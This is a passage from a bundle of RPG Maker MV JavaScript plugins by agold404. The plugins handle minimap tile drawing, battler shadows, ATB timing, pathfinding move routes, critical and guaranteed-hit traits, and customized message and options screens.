	const bmp=this.bitmap; if(!bmp) return;
	
	const j0=y,je=y+h;
	const i0=x,ie=x+w;
	const limX=f.tbl[3][0](),dx0=Math.max(~~(w/limX),1);
	const limY=f.tbl[3][1](),dy0=Math.max(~~(h/limY),1);
	let dx=dx0,dy=dy0;
	if(f.tbl[4](dx0,dy0)!==1){
		if(dx===dy||Math.max(dx,dy)<4) ++dy;
	}
	//if(window._dbg) console.log(dx0,dy0,f.tbl[4](dx0,dy0),'',dx,dy,f.tbl[4](dx,dy)); // debug
	const W=$dataMap.width<<1,dt=this._drawTimeoutMs,arr=[];
	const ctr0=0<dt?3e0|0:Infinity;
	let timesup=false,tF=0;
	do{
		this._strtDy|=0; ++this._strtDy; this._strtDy%=dy;
		this._strtDx|=0; ++this._strtDx; this._strtDx%=dx;
		for(let j=j0+this._strtDy;j<je;j+=dy) for(let i=i0+this._strtDx;i<ie;i+=dx) if(!this.painted(i,j)) arr.uniquePush(j*W+i);
		//this._remainedTileCnt=arr.length;
		this._currDrawTileCnt=arr.length;
		if(!this._currDrawTileCnt) break;
		if(!tF) tF=0<dt?Date.now()+dt:Infinity;
		for(let ctr=ctr0;!timesup&&arr.length;){
			const curr=arr[~~(Math.random()*arr.length)];
			arr.uniquePop(curr);
			const i=curr%W,j=~~(curr/W);
			for(let z=0;z<4;++z){
				const tileId=$gameMap.tileId(i,j,z); if(!Tilemap.isVisibleTile(tileId)) continue;
				Tilemap.isAutotile(tileId)?this._drawAutotile(bmp, tileId, i*this._tileWidth, j*this._tileHeight):this._drawNormalTile(bmp, tileId, i*this._tileWidth, j*this._tileHeight);
			}
			this.painted_setVal(i,j,true);
			if(!(0<--ctr)){
				ctr=ctr0;
				const t=Date.now();
				if(tF<t){ timesup=true; break; }
			}
		}
	}while(!timesup&&(1<dx||1<dy)); // don't use !arr.length : might be the last that meets time's up.
},t).add('_isTableTile',function f(){
	return Tilemap.prototype._isTableTile.apply(this,arguments);
},t).add('_drawNormalTile',function f(bitmap, tileId, dx, dy){
	const setNumber=Tilemap.isTileA5(tileId)?4:5+(tileId>>8);
	const source=this.bitmaps[setNumber];
	if(source){
		const w=this._tileWidth;
		const h=this._tileHeight;
		const sx=( ((tileId>>4)&8) + (tileId&7) )*w;
		const sy=(  (tileId>>3)&15              )*h;
		bitmap.bltImage(source, sx, sy, w, h, dx, dy, w, h);
	}
},t).add('_drawAutotile',function f(bitmap, tileId, dx, dy){
	let autotileTable = Tilemap.FLOOR_AUTOTILE_TABLE;
	let kind = Tilemap.getAutotileKind(tileId); // will >=0 ; autoTile only, whose id >= the base =2048
	let shape = Tilemap.getAutotileShape(tileId);
	let tx=kind&7;
	let ty=kind>>3;
	let bx = 0;
	let by = 0;
	let setNumber = 0;
	let isTable = false;

	if (Tilemap.isTileA1(tileId)) {
		// var waterSurfaceIndex = [0, 1, 2, 1][this.animationFrame % 4];
		setNumber = 0;
		if(kind<4){
			bx=kind<2?2:6;
			by=kind&1?3:0;
		}else{
			bx=tx>>2<<3;
			by=ty*6+((tx>>1)&1)*3;
			if(kind&1){
				bx += 6;
				autotileTable = Tilemap.WATERFALL_AUTOTILE_TABLE;
				// by += this.animationFrame % 3;
			}else bx+=2;
		}
	} else if (Tilemap.isTileA2(tileId)) {
		setNumber = 1;
		bx=tx<<1;
		by = (ty - 2) * 3;
		isTable = this._isTableTile(tileId);
	} else if (Tilemap.isTileA3(tileId)) {
		setNumber = 2;
		bx=tx<<1;
		by=(ty-6)<<1;
		autotileTable = Tilemap.WALL_AUTOTILE_TABLE;
	} else if (Tilemap.isTileA4(tileId)) {
		setNumber = 3;
		bx=tx<<1;
		by=Math.floor(((ty-10)*5+(ty&1))*0.5);
		if(ty&1) autotileTable=Tilemap.WALL_AUTOTILE_TABLE;
	}

	const table=autotileTable[shape],source=this.bitmaps[setNumber];
	if (table && source) {
		const chs=[0,3,2,1],w1=this._tileWidth>>1,h1=this._tileHeight>>1;
		for(let i=0;i<4;++i){
			let qsx = table[i][0];
			let qsy = table[i][1];
			let sx1=((bx<<1)+qsx)*w1;
			let sy1=((by<<1)+qsy)*h1;
			let dx1=dx+(i& 1)*w1;
			let dy1=dy+(i>>1)*h1;
			if(isTable&&(qsy===1||qsy===5)){
				let qsx2 = qsx;
				let qsy2 = 3;
				if(qsy===1) qsx2=chs[qsx];
				let sx2=((bx<<1)+qsx2)*w1;
				let sy2=((by<<1)+qsy2)*h1;
				bitmap.bltImage(source, sx2, sy2, w1, h1, dx1, dy1, w1, h1);
				dy1 += h1/2;
				bitmap.bltImage(source, sx1, sy1, w1, h1/2, dx1, dy1, w1, h1/2);
			}else bitmap.bltImage(source, sx1, sy1, w1, h1, dx1, dy1, w1, h1);
		}
	}
},t);
} // Sprite_Minimap

})();


﻿"use strict";
/*:
 * @plugindesc actor:<noShadow> enemy:<showShadow>
 * @author agold404
 * @help disable shadow for the one
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Sprite_Battler.prototype).add('setShadow_commonBeg',function f(btlr){
	this._shadowSprite.alpha=1;
	this._shadowSprite.visible=true;
}).add('setShadow_commonEnd',function f(btlr){
	if(!btlr) this._shadowSprite.visible=false;
}).add('setShadow',function f(btlr){
	if(!this._shadowSprite) return;
	btlr=btlr||this._battler;
	this.setShadow_commonBeg(btlr);
	if(btlr){ const data=btlr.getData(); if(this.isHideShadow(data)){
		this._shadowSprite.visible=false;
	} }
	this.setShadow_commonEnd(btlr);
});

new cfc(t={}).add('setBattler',function f(btlr){
	const func=f.tbl.get(this.constructor);
	const rtv=func&&func.apply(this,arguments);
	this.setShadow();
	return rtv;
},new Map([
[Sprite_Actor,Sprite_Actor.prototype.setBattler],
[Sprite_Enemy,Sprite_Enemy.prototype.setBattler],
]));
Sprite_Enemy.prototype.setBattler=Sprite_Actor.prototype.setBattler=t.setBattler;

new cfc(Sprite_Actor.prototype).add('isHideShadow',function f(data){
	return data && data.meta && data.meta.noShadow;
});

new cfc(Sprite_Enemy.prototype).add('isHideShadow',function f(data){
	return data && data.meta && !data.meta.showShadow;
});

})();


﻿"use strict";
/*:
 * @plugindesc ㄏㄏYEPㄏㄏ ( Game_Battler.prototype.updateATB 內的詠唱和at跑條的增加差使用同一函式，到底哪根筋覺得會一樣 )
 * @author agold404
 * @help 分ㄛ
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Battler.prototype).add('updateATB',function f(){
	if(this.isDead()) return this.resetAllATB();
	if(!this.canMove()){
		this.updateATBStates();
		return;
	}
	if(this.isATBCharging()){
		if(!this.currentAction()) this.resetAllATB();
		if(this.currentAction() && this.currentAction().item() === null) this.resetAllATB();
	}
	if(this.isATBCharging()){
		const value = this.atbCharge() + this.atbChargeTick();
		this.setATBCharge(value);
	}else if(this.atbRate() < 1){
		const value = this.atbSpeed() + this.atbSpeedTick();
		this.setATBSpeed(value);
	}
},t,true,true).add('atbChargeTick',function f(){
	return this.atbTickValue() * BattleManager.tickRate();
},t,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 輕鬆自動尋路移動路徑API
 * @author agold404
 * @help in event script: chr.moveToLoc(evtId,x,y,dir,speed,opt); ; in moveRoute script: chr.move1ToLoc(evtId,x,y,dir,speed,opt);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=Game_Character.MOVEROUTE_EMPTY={
list:[
{code:Game_Character.ROUTE_END,parameters:[]},
],
repeat:false,
wait:false,
skippable:true,
};
t.list.push(t.list[0]);
t.list[-1]=t.list[0];

new cfc(Game_Character.prototype).add('turnTo',function f(arg0){
	if(arg0&&arg0.constructor===String){ const m=arg0.match(f.tbl[0]); if(m){
		const rev=m[1]!==m[2],evt=(m[2]==='p')?$gamePlayer:this._mvToGetTrgt(m[2]);
		if(!evt) return;
		if(rev) this.turnAwayFromCharacter(evt);
		else this.turnTowardCharacter(evt);
	} }else{
		arg0|=0;
		if(arg0 in f.tbl[1]) this._direction=arg0;
	}
},[
/^evt (-?([0-9]+|p))$/,
{2:2,4:4,6:6,8:8,},
],true,true).add('setMoveRouteEmpty',function f(){
	this._moveRoute=Game_Character.MOVEROUTE_EMPTY;
	this._moveRouteIndex=-1;
}).add('_mvToGetTrgt',function f(evtId){
	if(evtId==='p') return $gamePlayer;
	else if(evtId==-1) return this;
	else return $gameMap && $gameMap._events && $gameMap._events[evtId];
}).add('_mvToLoc',function f(x,y,dir,opt){
	if(this.x===x && this.y===y){ if(!opt||!opt.repeat--) this.setMoveRouteEmpty(); this.turnTo(dir); }
	else{ let d=this.findDirTo([[x,y]])||this.findDirectionTo(x,y); this.moveDiagNumpad(d); }
},undefined,true,true).add('moveToLoc',function f(evtId,x,y,dir,speed,opt){
	if(speed) this._moveSpeed=speed;
	const evt=this._mvToGetTrgt(evtId);
	if(evt){ x+=evt.x; y+=evt.y; }
	return this.forceMoveRoute({
		trgt:{x:x,y:y,d:dir,o:opt,},
		list:f.tbl[0],
		repeat:true,
		skippable:true,
	});
},[
[
//{code:Game_Character.ROUTE_SCRIPT,parameters:['let t=this._moveRoute.trgt; if(this.x===t.x && this.y===t.y){ this._moveRoute.repeat=false; this.turnTo(t.d); }else{ let d=this.findDirTo([[t.x,t.y]])||this.findDirectionTo(t.x,t.y); this.moveDiagNumpad(d); }']},
{code:Game_Character.ROUTE_SCRIPT,parameters:['let t=this._moveRoute.trgt; this._mvToLoc(t.x,t.y,t.d,t.o);']},
Game_Character.MOVEROUTE_EMPTY.list[0],
],
],true,true).add('move1ToLoc',function f(evtId,x,y,dir,speed,opt){
	if(speed) this._moveSpeed=speed;
	const evt=this._mvToGetTrgt(evtId);
	if(evt){ x+=evt.x; y+=evt.y; }
	return this._mvToLoc(x,y,dir,opt);
});

})();


﻿"use strict";
/*:
 * @plugindesc 使技能/道具可爆擊/必中
 * @author agold404
 * @help 指定傷害類別+技能/道具類別，使傷害公式的部分可爆擊
 * 
 * <可爆技能:[ [技能類別,傷害類別], ... ]>
 * <可爆道具:[ [道具類別,傷害類別], ... ]>
 * <必中技能:[ [技能類別,傷害類別], ... ]>
 * <必中道具:[ [道具類別,傷害類別], ... ]>
 * 技能類別：請見自行設定的資料庫的技能類別編號
 * 道具類別：1=一般道具 ; 2=關鍵道具 ; 3=隱藏A ; 4=隱藏B 。填入的東西沒有>0則代表任意
 * 傷害類別：見設定傷害中的傷害類別清單，最上面那個是0，依序往下1,2,3,... 。填入的東西沒有>0則代表任意
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
const kwtxts={
可爆:{
skill:"可爆技能",
item:"可爆道具",
},
必中:{
skill:"必中技能",
item:"必中道具",
},
},kws={};
for(let c in kwtxts){
	const src=kwtxts[c],dst=kws[c]={};
	for(let t in src) gbb.addEnum(dst[t]="TRAIT_"+src[t]);
}

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits,c,t; if(!ts) ts=dataobj.traits=[];
	
	for(let ci=0,carr=['可爆','必中'],cs=carr.length;ci!==cs;++ci){
		const c=carr[ci];
		for(let ti=0,tarr=['skill','item'],sz=tarr.length;ti!==sz;++ti){
			const t=tarr[ti];
			if(meta[kwtxts[c][t]]){ for(let x=0,arr=JSON.parse(meta[kwtxts[c][t]]),xs=arr.length;x!==xs;++x){
				let itype=arr[x][0]|0,dtype=arr[x][1]|0;
				if(!(itype>=0)) itype='any';
				if(!(dtype>=0)) dtype='any';
				ts.push({code:gbb[kws[c][t]],dataId:itype+','+dtype,value:1,});
			} }
		}
	}
},
]);


new cfc(DataManager).add('可爆必中_getItemKey_skill',function f(skill){
	return skill&&(skill.stypeId+','+skill.damage.type);
}).add('可爆必中_getItemKey_item',function f(item){
	return item&&(item.itypeId+','+item.damage.type);
}).add('可爆必中_getItemKeys_skill',function f(item){
	const rtv=[]; if(!item) return rtv;
	for(let i=0,iarr=[item.stypeId,'any'],sz=iarr.length;i!==sz;++i) for(let d=0,darr=[item.damage.type,'any'],ds=darr.length;d!==ds;++d) rtv.push(iarr[i]+','+darr[d]);
	return rtv;
}).add('可爆必中_getItemKeys_item',function f(item){
	const rtv=[]; if(!item) return rtv;
	for(let i=0,iarr=[item.itypeId,'any'],sz=iarr.length;i!==sz;++i) for(let d=0,darr=[item.damage.type,'any'],ds=darr.length;d!==ds;++d) rtv.push(iarr[i]+','+darr[d]);
	return rtv;
});

t=function f(key){ return this.uniqueHas(key); };
new cfc(Game_Battler.prototype).add('_可爆ㄇ_skill',function f(item){
	const code=Game_BattlerBase[f.tbl[0]];
	const keys=DataManager.可爆必中_getItemKeys_skill(item);
	return keys.some(f.tbl[1],this.traitsSet(code));
},[
kws.可爆.skill,
t,
]).add('_可爆ㄇ_item',function f(item){
	const code=Game_BattlerBase[f.tbl[0]];
	const keys=DataManager.可爆必中_getItemKeys_item(item);
	return keys.some(f.tbl[1],this.traitsSet(code));
},[
kws.可爆.item,
t,
]).add('_必中ㄇ_skill',function f(item){
	const code=Game_BattlerBase[f.tbl[0]];
	const keys=DataManager.可爆必中_getItemKeys_skill(item);
	return keys.some(f.tbl[1],this.traitsSet(code));
},[
kws.必中.skill,
t,
]).add('_必中ㄇ_item',function f(item){
	const code=Game_BattlerBase[f.tbl[0]];
	const keys=DataManager.可爆必中_getItemKeys_item(item);
	return keys.some(f.tbl[1],this.traitsSet(code));
},[
kws.必中.item,
t,
]);

new cfc(Game_Battler.prototype).add('可爆ㄇ',function f(item){
	if(!item || !item.damage) return false;
	if(item.damage.critical) return true;
	if(!f.tbl[0]) f.tbl[0]=new Game_Item(item);
	f.tbl[0].setObject(item);
	const func=f.tbl[1][f.tbl[0]._dataClass];
	return func&&func.apply(this,arguments);
},[
undefined,
{
skill:Game_Battler.prototype._可爆ㄇ_skill,
item:Game_Battler.prototype._可爆ㄇ_item,
},
]).add('必中ㄇ',function f(item){
	if(!item) return false;
	if(item.hitType===0) return true;
	if(!f.tbl[0]) f.tbl[0]=new Game_Item(item);
	f.tbl[0].setObject(item);
	const func=f.tbl[1][f.tbl[0]._dataClass];
	return func&&func.apply(this,arguments);
},[
undefined,
{
skill:Game_Battler.prototype._必中ㄇ_skill,
item:Game_Battler.prototype._必中ㄇ_item,
},
]);


new cfc(Game_Action.prototype).add('itemCri',function f(trgt){
	const item=this.item(),subj=this.subject();
	return subj.可爆ㄇ(item) ? (subj.cri+item.crit) * (1-trgt.cev) : 0;
},undefined,true,true).add('itemHit',function f(){
	const item=this.item(),subject=this.subject();
	return subject.必中ㄇ(item) ? Infinity : f.ori.apply(this,arguments);
}).add('itemEva',function f(){
	const rtv=f.ori.apply(this,arguments); if(rtv<=0) return rtv;
	const item=this.item(),subject=this.subject();
	return subject.必中ㄇ(item) ? 0 : rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 對話視窗客製化
 * @author agold404
 * @help BLR_custom/Message/mapMsg-Window_Message.txt
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
'BLR_custom/Message/mapMsg-Window_Message.txt',
];

for(let x=0,arr=[Scene_Map,Scene_Battle,],xs=arr.length;x!==xs;++x) new cfc(arr[x].prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return rtv;
},t);
new cfc(Scene_Base.prototype).add('createMessageWindow_merged',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._create_adjustMsgWindow();
	return rtv;
}).add('_create_adjustMsgWindow_getData',function f(){
	const rawdata=ImageManager.otherFiles_getData(f.tbl[0]); if(!rawdata) return;
	return this._customizeData_messageWindow=(this._customizeData_messageWindow||JSON.parse(rawdata));
},t).add('_create_adjustMsgWindow',function f(){
	const data=this._create_adjustMsgWindow_getData(),msgw=this._messageWindow;
	if(!data) return;
	msgw._customizeData=data;
	const bp=msgw._windowBackSprite,fp=msgw._windowFrameSprite;
	if(data.imgback) msgw._refreshBack();
	if(data.imgframe){
		msgw._refreshFrame();
		msgw.addChildAt(msgw._windowFrameSprite,msgw.children.indexOf(msgw._windowContentsSprite)+1);
	}
});

new cfc(Game_System.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.customizeData_msgWindow_setUseOri(0);
	return rtv;
}).add('customizeData_msgWindow_setUseOri',function f(val){
	this._customizeData_msgWindow_useOri=val;
}).add('customizeData_msgWindow_getUseOri',function f(){
	return this._customizeData_msgWindow_useOri;
});

new cfc(Window_Base.prototype).add('customizeData_isUseOri',function f(){
	return this._customizeData_isUseOri || $gameSystem.customizeData_msgWindow_getUseOri();
}).add('customizeData_isUseOri_setVal',function f(val){
	return this._customizeData_isUseOri=val;
}).add('_refreshBack',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._updateBackSprite();
	return rtv;
}).add('_refreshFrame',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._updateFrameSprite();
	return rtv;
}).add('_updateBackSprite',function f(){
	const data=this._customizeData,bp=this._windowBackSprite;
	if(data && !this._background && !this.customizeData_isUseOri()){
		if(data.imgback){
			const b={};
			if(!this._customizeData_bak_bp){
				this._customizeData_bak_bp=b;
				b.bitmap=bp.bitmap;
				b.x=bp.x;
				b.y=bp.y;
				b.scaleX=bp.scale.x;
				b.scaleY=bp.scale.y;
			}
			bp.bitmap=ImageManager.loadNormalBitmap(data.imgback);
			if('x' in data) bp.x=data.x;
			if('y' in data) bp.y=data.y;
			if('scaleX' in data) bp.scale.x=data.scaleX;
			if('scaleY' in data) bp.scale.y=data.scaleY;
		}
	}else{
		const b=this._customizeData_bak_bp;
		if(b){
			bp.bitmap=b.bitmap;
			bp.x=b.x;
			bp.y=b.y;
			bp.scale.x=b.scaleX;
			bp.scale.y=b.scaleY;
		}
	}
}).add('_updateFrameSprite',function f(){
	const data=this._customizeData,fp=this._windowFrameSprite;
	if(data && !this._background && !this.customizeData_isUseOri()){
		if(data.imgframe){
			const b={};
			if(!this._customizeData_bak_fp){
				this._customizeData_bak_fp=b;
				b.bitmap=fp.bitmap;
				b.x=fp.x;
				b.y=fp.y;
				b.scaleX=fp.scale.x;
				b.scaleY=fp.scale.y;
			}
			fp.bitmap=ImageManager.loadNormalBitmap(data.imgframe);
			if('x' in data) fp.x=data.x;
			if('y' in data) fp.y=data.y;
			if('scaleX' in data) fp.scale.x=data.scaleX;
			if('scaleY' in data) fp.scale.y=data.scaleY;
		}
	}else{
		const b=this._customizeData_bak_fp;
		if(b){
			fp.bitmap=b.bitmap;
			fp.x=b.x;
			fp.y=b.y;
			fp.scale.x=b.scaleX;
			fp.scale.y=b.scaleY;
		}
	}
	if(fp) fp.alpha=this._windowSpriteContainer.alpha;
}).add('open',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._updateBackSprite();
	this._updateFrameSprite();
	return rtv;
});
new cfc(Window_Message.prototype).add('startMessage',function f(){
	const txt=$gameMessage.allText();
	this.customizeData_isUseOri_setVal(false);
	if(txt.match(f.tbl[0])) this.customizeData_isUseOri_setVal(true);
	if(txt.match(f.tbl[1])) this.customizeData_isUseOri_setVal(false);
	return f.ori.apply(this,arguments);
},[
/\\SETUSEORIGIN/g,
/\\SETUSECUSTOM/g,
]);

})();


﻿"use strict";
/*:
 * @plugindesc refine Scene_Options
 * @author agold404
 * @help BLR_custom/Scene_Option.txt
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
'BLR_custom/Scene_Options.txt',
];

new cfc(SceneManager).add('run',function f(){
	const rtv=f.ori.apply(this,arguments);
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return rtv;
},t);
new cfc(Scene_Boot.prototype).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._applyCustomData_SceneOption();
	return rtv;
}).add('_applyCustomData_SceneOption',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	const data=ImageManager.otherFiles_getData(f.tbl[0]); if(!data) return;
	const cs=DataManager._customSceneOption=JSON.parse(data); if(!cs) return;
	;
	return rtv;
},t);


const a=function Scene_Options2(){
	this.initialize(this,arguments);
};
a.ori=Scene_Options;
t=[a.ori.prototype, t&&t[0]];
window[a.name]=a;
const p=a.prototype=Object.create(t[0]);
p.constructor=a;

t.push({
"back":"_create_back",
"label":"_create_label",
"button":"_create_button",
"numBar":"_create_numBar",
"switch":"_create_switch",
"setorigin":"_create_setorigin",
},'rgba(255,255,255,0.75)',()=>{});

new cfc(Scene_Options.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	ImageManager.otherFiles_addLoad(f.tbl[1]);
	this._lastTouchSelect=-1;
	this._idxRow=undefined;
	return rtv;
},t).add('create',function f(){
	//const rtv=f.ori.apply(this,arguments);
	Scene_MenuBase.prototype.create.call(this);
	const ow=this._optionsWindow=new Window_Options(); ow.select(-1); ow.processCursorMove=f.tbl[4];
	const gw=Graphics.boxWidth,gh=Graphics.boxHeight;
	this._selRect=new Sprite(new Bitmap(gw,gh)); this._selRect.bitmap.fillRect(0,0,gw,gh,f.tbl[3]); this._selRect.setFrame(0,0,0,0); 
	this.addChild(this._alpha0=new Sprite()); this._alpha0.alpha=0;
	this._alpha0.x=gw;
	this._alpha0.y=gh;
	this._alpha0.addChild(this._optionsWindow);
	const rawdata=ImageManager.otherFiles_getData(f.tbl[1]); if(!rawdata) return f.ori.apply(this,arguments);
	const data=JSON.parse(rawdata),state={x:0,y:0,},root=this._root=new Sprite();
	root.addChild(root._back=new Sprite());
	root.addChild(root._front=new Sprite());
	root._front.addChild(this._selRect);
	this.addChild(root);
	this._interactives=[];
	this._displayValues=[];
	this._rows=[];
	this._bmpBarCursor=this.__create_loadImg(data.consts,data.consts.imgBarCursor);
	for(let x=0;x<data.layout.length;++x) this.__create_selectFromInfo(root,data,state,data.layout[x]);
	this.refreshToCurrentConf();
	//return rtv;
},t).add('__create_selectFromInfo',function f(root,data,state,info){
	const funcName=f.tbl[2][info&&info.type]; if(!funcName) return;
	return this[funcName](root,data.consts,state,info);
},t).add('__create_loadImg',function f(consts,relativePath){
	let path=consts.imgRoot||"";
	if(!f.tbl[0].has(path.slice(-1))) path+='/';
	path+=relativePath;
	return ImageManager.loadNormalBitmap(path);
},[
new Set('/','\\',''),
]).add('__create_newSp',function f(root,consts,info,isBack){
	const sp=new Sprite(this.__create_loadImg(consts,info.img));
	if(0&&!isBack){
		sp._info=info;
		sp._row=sp;
		this._rows.push(sp);
	}
	const p=new Sprite(); p.addChild(sp);
	(isBack?root._back:root._front).addChild(p);
	return p;
}).add('__create_setLoc',function f(state,info,sp){
	sp.x=state.x;
	sp.y=state.y;
	if('x' in info) sp.x+=info.x;
	if('y' in info) sp.y+=info.y;
}).add('__create_setNewLoc',function f(rectSize,state,info,sp){
	// after this.__create_setLoc()
	if('x' in info) state.x-=-info.x;
	if('y' in info) state.y-=-info.y;
	if(rectSize && 'width' in rectSize) state.x-=-rectSize.width;
	if(rectSize && 'height' in rectSize) state.y-=-rectSize.height;
}).add('_create_back',function f(root,consts,state,info){
	const sp=this.__create_newSp(root,consts,info,true);
	const c=sp.children[0];
	if('anchor' in info && info.anchor){
		if('x' in info.anchor) c.anchor.x=info.anchor.x;
		if('y' in info.anchor) c.anchor.y=info.anchor.y;
	}
	this.__create_setLoc(state,info,sp);
	this.__create_setNewLoc(consts&&consts.back,state,info,sp);
}).add('_create_label',function f(root,consts,state,info){
	const sp=this.__create_newSp(root,consts,info,true);
	this.__create_setLoc(state,info,sp);
	this.__create_setNewLoc(consts&&consts.label,state,info,sp);
}).add('_create_button',function f(root,consts,state,info){
	const sp=this.__create_newSp(root,consts,info);
	const c=sp.children[0];
	this.__create_setLoc(state,info,sp);
	this.__create_setNewLoc(consts&&consts.button,state,info,sp);
	c._info=info;
	c._row=sp;
	this._interactives.push(c);
	sp._row=sp;
	sp._info=info;
	this._rows.push(sp);
}).add('_create_numBar',function f(root,consts,state,info){
	const sp=this.__create_newSp(root,consts,info);
	const c=sp.children[0];
	if('numBarAnchor' in consts){ const anchor=consts.numBarAnchor; if(anchor){
		if('x' in anchor) c.anchor.x=anchor.x;
		if('y' in anchor) c.anchor.y=anchor.y;
	} }
	c.x=consts.textWidth;
	this.__create_setLoc(state,info,sp);
	this.__create_setNewLoc(consts&&consts.numBar,state,info,sp);
	// bar
	{
		const img=this.__create_loadImg(consts,consts.imgBar);
		const bar=new Sprite(img);
		bar.x=consts.textWidth; if('scrollBarDx' in consts) bar.x+=consts.scrollBarDx;
		bar.anchor.y=c.anchor.y;
		if('numBarMax' in info) bar._numBarMax=info.numBarMax;
		else if('numBarMax' in consts) bar._numBarMax=consts.numBarMax;
		sp.addChild(sp._bar=bar);
		bar._limWidth=consts.scrollBarWidth-0;
		img.addLoadListener(f.tbl[0].bind(bar));
		bar._info=info;
		bar._row=sp;
		this._interactives.push(bar);
		this._displayValues.push(bar);
		const cursor=bar._cursor=new Sprite(this._bmpBarCursor);
		cursor.anchor.x=0.5;
		cursor.anchor.y=bar.anchor.y;
		bar.addChild(cursor);
		img.addLoadListener(f.tbl[1].bind(this,bar));
	}
	sp._row=sp;
	sp._info=info;
	this._rows.push(sp);
},[
function(bm){
	if(isNaN(this._limWidth)) return;
	this.scale.x=this._limWidth/bm.width;
},
function(sp,bm){
	this._refreshToCurrentConf_numBar(sp);
},
]).add('_create_switch',function f(root,consts,state,info){
	const sp=this.__create_newSp(root,consts,info);
	const c=sp.children[0];
	if('switchAnchor' in consts){ const anchor=consts.switchAnchor; if(anchor){
		if('x' in anchor) c.anchor.x=anchor.x;
		if('y' in anchor) c.anchor.y=anchor.y;
	} }
	c.x=consts.textWidth;
	this.__create_setLoc(state,info,sp);
	this.__create_setNewLoc(consts&&consts.switch,state,info,sp);
	// selected/unselected
	if(consts.switchButtons){ this._imgSels={
		"selected":this.__create_loadImg(consts,consts.switchButtons.selected.img),
		"unselected":this.__create_loadImg(consts,consts.switchButtons.unselected.img),
	}; }
	// options
	sp._switchBtns={};
	if(info.switches){ for(let x=0,lastp;x<info.switches.length;++x){
		const p=new Sprite(); p.anchor.y=0;
		if(lastp) p.x=lastp.x+lastp.width;
		else p.x=consts.textWidth;
		if('switchWidth' in consts) p.width=consts.switchWidth;
		const pathTxt=consts.switchTexts[info.switches[x]].img;
		let txtsp;
		if(pathTxt){
			const img=this.__create_loadImg(consts,pathTxt);
			p.addChild(txtsp=new Sprite(img));
			txtsp.anchor.y=c.anchor.y;
			txtsp._switchKey=info.switches[x];
			txtsp._info=info;
			txtsp._row=sp;
			this._interactives.push(txtsp);
		}
		const btn=new Sprite(this._imgSels.unselected);
		btn.anchor.y=c.anchor.y;
		p.addChild(btn);
		btn._switch=txtsp._switch=btn;
		btn._switchKey=info.switches[x];
		btn._info=info;
		btn._row=sp;
		this._interactives.push(btn);
		this._displayValues.push(btn);
		sp.addChild(p);
		this._imgSels.selected.addLoadListener(f.tbl[0].bind(txtsp));
		this._imgSels.unselected.addLoadListener(f.tbl[0].bind(txtsp));
		sp._switchBtns[btn._switchKey]=btn;
		lastp=p;
	} }
	sp._row=sp;
	sp._info=info;
	this._rows.push(sp);
},[
function(bitmap){ if(!(this.x>=bitmap.width)) this.x=bitmap.width; },
{
"on":function f(){},
"off":function f(){},
},
]).add('_create_setorigin',function f(root,consts,state,info){
	if('x' in info) state.x=info.x;
	if('y' in info) state.y=info.y;
	if('dx' in info) state.x+=info.dx;
	if('dy' in info) state.y+=info.dy;
}).add('update',function f(){
	this.updateFade();
	if(this._root) this._root.update();
	if(!TouchInput.isPressed()) this._lastTouchSelect=-1;
	if(TouchInput.isCancelled()||Input.isTriggered(f.tbl[0])) return this.popScene();
	const ti=TouchInput;
	const x=ti.x,y=ti.y;
	if(TouchInput.isTriggered()){
		if((this._lastTouchSelect=this.hitTest(x,y))>=0){
			this.moveSelRectTo(this._lastTouchSelect);
		}
	}
	if(this._lastTouchSelect>=0 && TouchInput.isPressed()){
		this._doingLayoutIdx(this._lastTouchSelect,x,y);
	}
	const idxOri=this._idxRow,deltaUd=!Input.isRepeated('up')-!Input.isRepeated('down');
	if(deltaUd){
		if(isNaN(idxOri)) this._idxRow=Math.min(deltaUd,0);
		else this._idxRow+=deltaUd;
	}
	if(!this._rows||!this._rows.length) this._idxRow=-1;
	else{
		if(idxOri!==this._idxRow){
			this._idxRow+=this._rows.length;
			this._idxRow%=this._rows.length;
		}
		if(idxOri!==this._idxRow){
			const sp=this._rows[this._idxRow];
			this.moveSelRectTo(sp);
			const idx=this._getOptionsWindowSelectIdx(sp._info._key);
			this._optionsWindow.select(idx);
			SoundManager.playCursor();
		}
	}
	if(!(this._idxRow>=0)) return;
	const neg_adj=(!Input.isRepeated('right')-!Input.isRepeated('left'))*(1+Input.isPressed('shift')*f.tbl[1]);
	const isPressingOk=Input.isTriggered('ok');
	if(isPressingOk||neg_adj){
		if(idxOri===this._idxRow) SoundManager.playCursor();
		this._doingLayoutByKeyboard(this._rows[this._idxRow],neg_adj,isPressingOk);
	}
},[
'cancel',
9,
]).add('hitTest',function f(x,y){
